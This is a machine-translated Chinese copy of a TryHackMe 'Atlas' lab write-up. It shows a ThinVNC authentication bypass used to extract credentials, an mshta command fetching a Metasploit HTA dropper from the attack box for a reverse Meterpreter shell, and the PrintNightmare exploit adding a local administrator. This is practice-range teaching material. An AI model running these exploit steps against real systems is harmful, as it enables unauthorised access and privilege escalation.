<html>
<head>
<title>TryHackMe writeup: Atlas</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:Atlas</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-atlas-c3dff235d109?source=collection_archive---------0-----------------------#2022-05-06">https://infosecwriteups.com/tryhackme-writeup-atlas-c3dff235d109?source=collection_archive---------0-----------------------#2022-05-06</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="f2c6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><a class="ae kp" href="https://tryhackme.com/room/atlas" rel="noopener ugc nofollow" target="_blank">“MurilandOracle”(2021)</a>发表了一个TryHackMe教程室，讨论了一个简单的ThinVNC漏洞，一点利用开发和测试，以及PrintNightmare漏洞。在我永无止境的“打破规则”的追求中，这个房间比MurilandOracle计划的多花了我大约一周的时间来完成。尽管如此，打扫房间还是一次有趣的经历。这篇文章将详细介绍我是如何完成房间的。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj kq"><img src="../Images/4128ff5fece61377681a48b513cf3798.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hvuog2pl0lQzIEk_DnHN9Q.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">基础图片:<a class="ae kp" href="https://www.amazon.com/Age-Selfishness-Morality-Financial-Crisis/dp/1419715984" rel="noopener ugc nofollow" target="_blank">坎宁安和古德温(2015) </a></figcaption></figure><h1 id="a256" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">程序</h1><p id="3300" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">在开始之前，我编辑了攻击箱上的<code class="fe mj mk ml mm b">/etc/hosts</code>文件，并添加了下面一行:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="3e3d" class="mr lh iu mm b gz ms mt l mu mv">&lt;target ip&gt; atlas.thm</span></pre><p id="78a4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我这样做是因为我知道我不会一次就结束这个房间，而且TryHackMe boot2root机器的IP地址会随着每个新会话而改变。最好记录一个伪域名，而不是动态IP地址，这样每当我启动目标虚拟机时，我就可以用新的目标IP地址编辑<code class="fe mj mk ml mm b">/etc/hosts</code>文件。</p><p id="d181" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我点击第一个任务右上角的绿色“启动机器”按钮，开始探测机器。</p><h2 id="8e18" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">侦察</h2><p id="abe8" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">为了“让球滚动起来”，我从对目标机器的<a class="ae kp" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank"> nmap (n.d.) </a>扫描开始:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="123e" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.1.xml atlas.thm </strong>   <br/>Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.<br/>Starting Nmap 7.92 (<a class="ae kp" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a>) at [redacted] EDT<br/>NSE: Loaded 155 scripts for scanning.<br/>NSE: Script Pre-scanning.<br/>Initiating NSE at [redacted]</span></pre><p id="f96e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">房间里的人注意到目标机器正在运行Windows，因此需要使用<code class="fe mj mk ml mm b">-Pn</code>标志来忽略Windows不响应ICMP请求的事实，并继续启动端口扫描。<code class="fe mj mk ml mm b">-oX tcp_scan.1.xml</code>标志指示nmap以XML格式存储其结果。</p><p id="96b8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我已经用<code class="fe mj mk ml mm b">xsltproc</code>实用程序将原始的XML输出转换成可读的HTML格式:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="bd81" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ xsltproc tcp_scan.1.xml -o tcp_scan.html</strong></span></pre><p id="5a73" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">图1显示了<code class="fe mj mk ml mm b">xsltproc</code>输出的摘录，特别是目标系统上开放的端口:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nh"><img src="../Images/a2d6544049316b8cc9a96b42bae65398.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1TOq6CmfAIJQ9X2b6BvKKw.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图1 </strong></figcaption></figure><p id="bc04" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">有两个端口是打开的:一个是3389上的TCP驱动服务，另一个是8080端口上的TCP驱动服务。扫描还确定操作系统为“av tech Room Alert 26W environmental monitor”。</p><p id="4cdd" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><strong class="jt iv">注意，</strong>7680上的服务已经被<code class="fe mj mk ml mm b">tcpwrappped</code>化了，这意味着无论运行它的是什么，都会引用<code class="fe mj mk ml mm b">/etc/hosts.allow</code>和<code class="fe mj mk ml mm b">/etc/hosts.deny</code>文件，并根据它们的配置授予(或拒绝)访问权限(<a class="ae kp" href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sect-security_guide-tcp_wrappers_and_xinetd-tcp_wrappers_configuration_files" rel="noopener ugc nofollow" target="_blank"> Red Hat客户门户，n.d </a>)。还应该注意的是，<code class="fe mj mk ml mm b">tcpwrapped</code>服务不同于防火墙——这在<a class="ae kp" href="https://attrition.org/errata/charlatan/carolyn_meinel/www/tech-06.html" rel="noopener ugc nofollow" target="_blank">Attrition.org(c . a . 1998)</a>中有所讨论。</p><p id="1ddb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">对nmap结果的进一步检查显示了端口3389和8080上分别运行的服务。前者正在运行远程桌面协议服务(如Microsoft终端服务横幅所示；另见<a class="ae kp" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol" rel="noopener ugc nofollow" target="_blank">梁等人，2021 </a>)，而后者正在运行ThinVNC服务(<a class="ae kp" href="https://sourceforge.net/projects/thinvnc/" rel="noopener ugc nofollow" target="_blank"> Cybele等人，n . d .</a>)——如nmap结果中的以下片段所示:<code class="fe mj mk ml mm b">[…] ticate: Digest <strong class="jt iv">realm="ThinVNC"</strong>, qop="aut […]</code>。</p><p id="3532" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我决定使用后一种服务作为切入点。我用我的攻击箱的网络浏览器访问了托管在<code class="fe mj mk ml mm b">atlas.thm:8080</code>上的网络服务，得到如下信息(图2):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj ni"><img src="../Images/fae6557f4435db120fd1f997badc0765.png" data-original-src="https://miro.medium.com/v2/resize:fit:1034/format:webp/1*Lf1yd5aQjhNh-yDD-cJsfQ.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图2 </strong></figcaption></figure><p id="fa25" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我输入用户名/密码组合<code class="fe mj mk ml mm b">admin:admin</code>，它回复了同样的登录对话框。然后我点击取消，得到一个“401访问被拒绝”的错误页面。</p><p id="56f1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我运行<code class="fe mj mk ml mm b">searchsploit</code>来获取利用ThinVNC服务中的漏洞的潜在候选人:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="7c46" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ searchsploit thinvnc</strong><br/>------------------- -------------------------------------------<br/>Exploit Title                         |  Path                                                                        ------------------- -------------------------------------------<br/>ThinVNC 1.0b1 - Authentication Bypass | windows/remote/47519.py                                                     <br/>---------------------------------------------------------------<br/>Shellcodes: No Results</span></pre><p id="4fb8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">手头有了概念证明，我现在可以着手将其武器化。</p><h2 id="1a7a" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">初始访问</h2><p id="644c" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated"><code class="fe mj mk ml mm b">searchsploit</code>发现的概念证明是由<a class="ae kp" href="https://www.exploit-db.com/exploits/47519" rel="noopener ugc nofollow" target="_blank"> Tumamlapalli (2019) </a>设计的。我将上述概念证明复制到我的项目目录中，然后运行它，以获得如何使用它的“感觉”:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="39ed" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ cp /usr/share/exploitdb/exploits/windows/remote/47519.py ./exploit1.py</strong><br/>                                                                                                                                    <br/><strong class="mm iv">┌──(dna@deniers)-[~/Documents/THM/ctf/atlas]<br/>└─$ python3 exploit1.py</strong><br/>Usage:<br/>exploit1.py &lt;host&gt; &lt;port&gt;</span><span id="2e05" class="mr lh iu mm b gz nj mt l mu mv">Example:<br/>{} 192.168.0.10 5888</span></pre><p id="5ef8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">好吧。看起来该漏洞利用将主机名作为第一个参数，将端口作为第二个参数。我将尝试分别用<code class="fe mj mk ml mm b">atlas.thm</code>和<code class="fe mj mk ml mm b">8080</code>运行它:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="18e1" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ python3 exploit1.py atlas.thm 8080    </strong><br/>Traceback (most recent call last):<br/>  File "~/atlas/exploit1.py", line 39, in &lt;module&gt;<br/>    main()<br/>  File "~/atlas/exploit1.py", line 36, in main<br/>    exploit(host,port)<br/>  File "~atlas/exploit1.py", line 24, in exploit<br/>    print(body.splitlines()[2])<br/>IndexError: list index out of range</span></pre><p id="05c1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">显然，有些事情不对劲😭。根据错误消息判断，错误的根源在于脚本的<code class="fe mj mk ml mm b">exploit()</code>函数，似乎是由于解析某种字符串时出错。以下是我试图调试的漏洞的一个片段:</p><figure class="kr ks kt ku gu kv"><div class="bz fq l di"><div class="nk nl l"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">ThinVNC认证旁路利用(<a class="ae kp" href="https://www.exploit-db.com/exploits/47519" rel="noopener ugc nofollow" target="_blank"> Tumamlapalli，2019 </a>)</figcaption></figure><p id="e590" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><strong class="jt iv">注意</strong>这只是源代码的一个片段，所以我的AttackBox的终端输出的错误消息上的行号可能与片段中的行号不匹配。</p><p id="d7f6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">查看该漏洞的源代码，ThinVNC (1.0b1)似乎存在一个目录遍历漏洞，使得恶意黑客能够读取关于高于web服务器根目录的目录的<code class="fe mj mk ml mm b">.ini</code>文件。我将尝试手动利用这个东西:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="54f9" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ curl atlas.thm:8080/xyz/../../ThinVnc.ini</strong><br/>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL ThinVnc.ini was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;<br/>                                                                                                                                    <br/><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ curl atlas.thm:8080/xyz/../ThinVnc.ini </strong><br/>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL ThinVnc.ini was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;<br/>                                                                                                                                    <br/><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ curl atlas.thm:8080/xyz/ThinVnc.ini </strong><br/>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL xyz/ThinVnc.ini was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span></pre><p id="2d0f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在尝试了几分钟类似的<code class="fe mj mk ml mm b">curl</code> GET请求后，我决定进一步研究这个漏洞。看来概念证明被破坏了，由<a class="ae kp" href="https://github.com/MuirlandOracle/CVE-2019-17662" rel="noopener ugc nofollow" target="_blank">“muri landoracle”(2021 b)</a>设计的更可靠的概念证明将被用于访问系统。我开始将AG的漏洞下载到我的攻击箱中，然后对系统进行测试:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="b029" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ python3 CVE-2019-17662.py atlas.thm 8080</strong></span><span id="b1ac" class="mr lh iu mm b gz nj mt l mu mv">     _____ _     _    __     ___   _  ____                                                                                          <br/>    |_   _| |__ (_)_ _\ \   / / \ | |/ ___|                                                                                         <br/>      | | | '_ \| | '_ \ \ / /|  \| | |                                                                                             <br/>      | | | | | | | | | \ V / | |\  | |___                                                                                          <br/>      |_| |_| |_|_|_| |_|\_/  |_| \_|\____|                                                                                         <br/>                                                                                                                                    <br/>                            @MuirlandOracle<br/>[+] Credentials Found!<br/>Username:       Atlas<br/>Password:       [redacted]</span></pre><p id="9dd6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">成功了！对于有兴趣对该漏洞进行更彻底的评估并手动利用该漏洞的人，我将在附录A.1中进一步讨论。但有了这些凭据，我现在可以通过ThinVNC服务登录系统。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj nm"><img src="../Images/ba0712ccfc0159bd66460335853aa1b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1394/format:webp/1*mj93YJrz0W4lvrdlaOntFw.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图3 </strong></figcaption></figure><p id="4808" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将使用实用程序<a class="ae kp" href="https://remmina.org/" rel="noopener ugc nofollow" target="_blank"> Remmina (n.d.) </a>通过ThinVNC协议登录到目标系统。运行该实用程序后，主用户界面出现(图3)。事情应该设置为“RDP”(图3b)，我将通过点击左上角带有加号(“+”)图标的按钮来启动一个临时连接(图3a)。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nn"><img src="../Images/8ac8a9b74d3540b9525f57b48b55852c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o4YEgco0T3-YfPa65X3PqA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图4 </strong></figcaption></figure><p id="f79a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">打开另一个窗口(图4 ),要求用户输入RDP连接的配置。然后，我输入服务器(图4a)、用户名(图4b)和密码(图4c)。我还将Remmina配置为使用自定义的<code class="fe mj mk ml mm b">1380x768</code>分辨率(图4d和4e)来显示更大的屏幕，并启用了“共享文件夹”功能，这将允许目标系统从我的攻击箱中访问文件。最后，我通过点击“连接”按钮连接到目标机器的RDP服务(图4g)。以下窗口(图5)显示了目标机器的RDP驱动界面:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj no"><img src="../Images/9a8ef85ed81053ee30f6b209c413c959.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*83lLFhGbBxbrE402Ht3l_g.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图5 </strong></figcaption></figure><h2 id="aba5" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">后剥削</h2><p id="1582" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">就我个人而言，我更喜欢Meterpreter外壳(<a class="ae kp" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" rel="noopener ugc nofollow" target="_blank"> Metasploit Unleashed，n.d. </a>)。为了得到它，我最初尝试Metasploit的<code class="fe mj mk ml mm b">web_delivery</code>模块通过PowerShell和一个<code class="fe mj mk ml mm b">base64</code>编码的有效载荷来交付它——但是有效载荷无法执行。因此，我寻找了一种替代方法，通过HTA应用程序(<a class="ae kp" href="https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)" rel="noopener ugc nofollow" target="_blank"> Microsoft Docs，2013 </a>)来交付和执行有效载荷，这是由<a class="ae kp" href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" rel="noopener ugc nofollow" target="_blank"> Chandel (2019) </a>讨论的。在AttackBox上，我启动了Metasploit，然后配置并启动了<code class="fe mj mk ml mm b">hta_server</code>模块:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="b007" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ sudo msfconsole  </strong>              <br/>[sudo] password for dna: <strong class="mm iv">*inputs password*</strong></span><span id="afab" class="mr lh iu mm b gz nj mt l mu mv">[... snip ...]</span><span id="265f" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">msf6 &gt; use exploit/windows/misc/hta_server</strong><br/>[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp<br/><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; set SRVHOST 0.0.0.0</strong><br/>SRVHOST =&gt; 0.0.0.0<br/><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; set LHOST &lt;attackbox ip&gt;</strong><br/>LHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; exploit</strong><br/>[*] Exploit running as background job 0.<br/>[*] Exploit completed, but no session was created.</span><span id="67b4" class="mr lh iu mm b gz nj mt l mu mv">[*] Started reverse TCP handler on &lt;attackbox ip&gt;:4444 <br/>[*] Using URL: http://&lt;attackbox ip&gt;:8080/dropper.hta<br/>[*] Server started.</span></pre><p id="6c96" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在目标机器的命令提示符下运行了命令<code class="fe mj mk ml mm b">mshta.exe http://&lt;attackbox ip&gt;:8080/dropper.hta </code>之后，我得到了一个反向的Meterpreter shell，并开始与它进行交互:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="63e0" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt;</strong> [*] Sending stage (175174 bytes) to &lt;target ip&gt;<br/>[*] Meterpreter session 1 opened (&lt;attackbox ip&gt;:4444 -&gt; atlas.thm:49859 ) at [redacted] -0400</span><span id="6079" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; sessions -i 1</strong><br/>[*] Starting interaction with 1...</span><span id="2fdf" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="371d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">为了获得系统权限，我将尝试Meterpreter的<code class="fe mj mk ml mm b">priv</code>模块附带的传统<code class="fe mj mk ml mm b">getsystem</code>命令:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="14e2" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">meterpreter &gt; getsystem</strong><br/>[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:<br/>[-] Named Pipe Impersonation (In Memory/Admin)<br/>[-] Named Pipe Impersonation (Dropper/Admin)<br/>[-] Token Duplication (In Memory/Admin)<br/>[-] Named Pipe Impersonation (RPCSS variant)<br/>[-] Named Pipe Impersonation (PrintSpooler variant)<br/><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="5aa4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">看来<code class="fe mj mk ml mm b">getsystem</code>不行了。该室建议通过PrintNightmare漏洞向量提升权限(<a class="ae kp" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" rel="noopener ugc nofollow" target="_blank">微软安全响应中心，2021 </a>)。特别是，建议竞争者使用由Stewart和Hammond (2021) 设计的PrintNightmare实现。</p><p id="cc13" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">首先，我将把它的存储库克隆到攻击框上的我的项目文件夹中:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="621c" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$ git clone https://github.com/calebstewart/CVE-2021-1675</strong><br/>Cloning into 'CVE-2021-1675'...<br/>remote: Enumerating objects: 40, done.<br/>remote: Counting objects: 100% (40/40), done.<br/>remote: Compressing objects: 100% (32/32), done.<br/>remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0<br/>Receiving objects: 100% (40/40), 131.12 KiB | 2.22 MiB/s, done.<br/>Resolving deltas: 100% (9/9), done.<br/>                                                                                                                                    <br/><strong class="mm iv">┌──(dna@deniers)-[~/atlas]<br/>└─$</strong></span></pre><p id="1c97" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后在Meterpreter会话中，我在系统上启动了一个<code class="fe mj mk ml mm b">shell</code>接口，然后启动了PowerShell并启动了漏洞利用:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="6670" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">meterpreter &gt; powershell_shell</strong><br/><strong class="mm iv">PS &gt; . \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1<br/>PS &gt; Invoke-Nightmare</strong><br/>[+] using default new user: adm1n<br/>[+] using default new password: P@ssw0rd<br/>[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll</span><span id="6a62" class="mr lh iu mm b gz nj mt l mu mv">[*] atlas.thm - Meterpreter session 1 closed.  Reason: Died</span><span id="3f7a" class="mr lh iu mm b gz nj mt l mu mv">Terminate channel 1? [y/N] <strong class="mm iv">*Y*</strong><br/>[-] Error running command powershell_shell: Rex::TimeoutError Operation timed out.</span></pre><p id="6cb6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">从输出来看，看起来像是用用户名<code class="fe mj mk ml mm b">adm1n</code>和密码<code class="fe mj mk ml mm b">P@ssw0rd</code>创建了一个新的管理员帐户。现在，我将以这个新管理员用户的身份运行Windows命令提示符，方法是右键单击命令提示符并输入新创建的凭证(参见图6):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj np"><img src="../Images/ba6d76f8507290bb56279de4a40f7d72.png" data-original-src="https://miro.medium.com/v2/resize:fit:982/format:webp/1*B5TmqXbu8a17PF-zjbgOZA.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图6 </strong></figcaption></figure><p id="e038" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">用户名<code class="fe mj mk ml mm b">adm1n</code>被提供给用户字段(图6a)，密码<code class="fe mj mk ml mm b">P@ssw0rd</code>被提供给密码字段(图6b)。然后单击“OK”按钮进入管理员命令提示符。不幸的是，用户名和密码无法识别(图7)。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj nq"><img src="../Images/101dbdece7dc6fc718782a5071e11f07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*qbyHyIAcA5WLLi9TzuApEg.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图7 </strong></figcaption></figure><p id="453f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">看起来我需要找一个“工作场所”</p></div><div class="ab cl nr ns hy nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="in io ip iq ir"><p id="d8cb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在这个实验中，我切换到Remmina打开的远程桌面实例，并通过远程桌面从PowerShell界面运行漏洞利用:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="e483" class="mr lh iu mm b gz ms mt l mu mv">Windows PowerShell<br/>Copyright (C) Microsoft Corporation. All rights reserved.</span><span id="ed6e" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt; Import-Module \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1</strong></span><span id="15ed" class="mr lh iu mm b gz nj mt l mu mv">Security warning<br/>Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your<br/>computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning<br/>message. Do you want to run \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1?<br/>[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R</span><span id="ed51" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt; Invoke-Nightmare</strong><br/>[+] using default new user: adm1n<br/>[+] using default new password: P@ssw0rd<br/>[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll<br/>[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"<br/>[+] added user  as local administrator<br/>[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll<br/><strong class="mm iv">PS C:\Users\Atlas&gt; net user</strong></span><span id="596a" class="mr lh iu mm b gz nj mt l mu mv">User accounts for \\GAIA</span><span id="dab8" class="mr lh iu mm b gz nj mt l mu mv">--------------------------------------------------------------------<br/>adm1n <strong class="mm iv">[*]</strong>                Administrator            Atlas<br/>DefaultAccount           Guest                    WDAGUtilityAccount<br/>The command completed successfully.</span><span id="1b88" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt;</strong></span></pre><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj ny"><img src="../Images/9275b45669e48fb28ed3af7b33d6f03a.png" 